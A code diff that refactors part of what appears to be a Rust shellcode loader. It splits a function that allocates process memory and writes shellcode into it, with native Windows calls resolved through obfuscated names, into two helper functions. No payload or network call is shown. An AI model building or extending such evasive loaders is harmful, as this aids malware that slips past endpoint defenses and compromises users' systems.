@@ -69,43 +69,57 @@ type FnNtProtectVirtualMemory = unsafe extern "system" fn(
     *mut u32,
 ) -> i32;
 
-fn allocate_and_write_shellcode(buf: &[u8]) -> Option<*mut c_void> {
+fn allocate_rw_memory(size: usize) -> Option<*mut c_void> {
     let current_process: isize = -1;
 
     unsafe {
         let f_alloc: FnNtAllocateVirtualMemory = std::mem::transmute(g(OBF_NT_ALLOCATE_VIRTUAL_MEMORY));
-        let f_write: FnNtWriteVirtualMemory = std::mem::transmute(g(OBF_NT_WRITE_VIRTUAL_MEMORY));
 
         let mut base: *mut c_void = std::ptr::null_mut();
-        let mut size: usize = buf.len();
+        let mut alloc_size = size;
 
         let status = f_alloc(
             current_process as _,
             &mut base,
             0,
-            &mut size,
+            &mut alloc_size,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
         );
 
-        if !NT_SUCCESS(status) {
-            return None;
+        if NT_SUCCESS(status) {
+            Some(base)
+        } else {
+            None
         }
+    }
+}
+
+fn write_to_memory(destination: *mut c_void, source: &[u8]) -> bool {
+    let current_process: isize = -1;
+
+    unsafe {
+        let f_write: FnNtWriteVirtualMemory = std::mem::transmute(g(OBF_NT_WRITE_VIRTUAL_MEMORY));
 
         let mut written: usize = 0;
         let status = f_write(
             current_process as _,
-            base,
-            buf.as_ptr() as *mut c_void,
-            buf.len(),
+            destination,
+            source.as_ptr() as *mut c_void,
+            source.len(),
             &mut written,
         );
 
-        if !NT_SUCCESS(status) {
-            return None;
-        }
+        NT_SUCCESS(status)
+    }
+}
 
+fn allocate_and_write_shellcode(buf: &[u8]) -> Option<*mut c_void> {
+    let base = allocate_rw_memory(buf.len())?;
+    if write_to_memory(base, buf) {
         Some(base)
+    } else {
+        None
     }
 }
 
